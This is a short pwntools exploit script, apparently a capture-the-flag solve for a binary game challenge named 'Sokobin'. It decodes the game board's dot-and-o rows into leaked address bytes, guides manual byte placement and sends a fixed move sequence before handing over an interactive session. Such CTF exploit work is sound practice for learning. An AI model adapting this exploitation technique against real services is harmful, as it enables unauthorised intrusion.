#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge")
libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.REMOTE:
        p = remote("addr", 1337)
    else:
        if args.GDB:
            p = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            """)
        else:
            p = process([exe.path])
    return p


def transform(s):
    reversed_s = s[::-1]
    binary_str = reversed_s.replace('.', '0').replace('o', '1')
    hex_address = []
    for i in range(0, len(binary_str), 8):
        chunk = binary_str[i:i+8]
        if len(chunk) < 8:
            chunk += '0' * (8 - len(chunk))
        hex_byte = format(int(chunk, 2), '02x')
        hex_address.append(hex_byte)
    return ''.join(hex_address)


def main():
    p = conn()

    p.recvuntil(b"Sokobin!")
    for i in range(13):
        p.recvline()
    upper = p.recvline()
    upper_intended = upper

    print(upper)
    #print(lower)
    upper = transform(upper.decode()[:-1])
    #lower = transform(lower.decode()[:-1])
    print(f"upper: {upper}")
    #print(f"lower: {lower}")
    p.sendline(b"w")

    
    p.recvuntil(b"Sokobin!\n")
    for i in range(13):
        p.recvline()
    lower = p.recvline()
    lower_intended = lower
    lower = transform(lower.decode()[:-1])
    print(f"lower: {lower}")

    print("This is how you should put the upper bytes:")
    print(upper_intended)
    print("This is how you should put the lower bytes:")
    print(lower_intended)
    print("correct the first 4 bits of lower to this:")
    print("....o.o.")

    p.sendline(b"w")
    p.sendline(b"s")
    p.sendline(b"w")
    p.sendline(b"w")
    p.sendline(b"w")
    p.sendline(b"s")
    p.sendline(b"r")
    p.sendline(b"r")
    p.interactive()


if __name__ == "__main__":
    main()
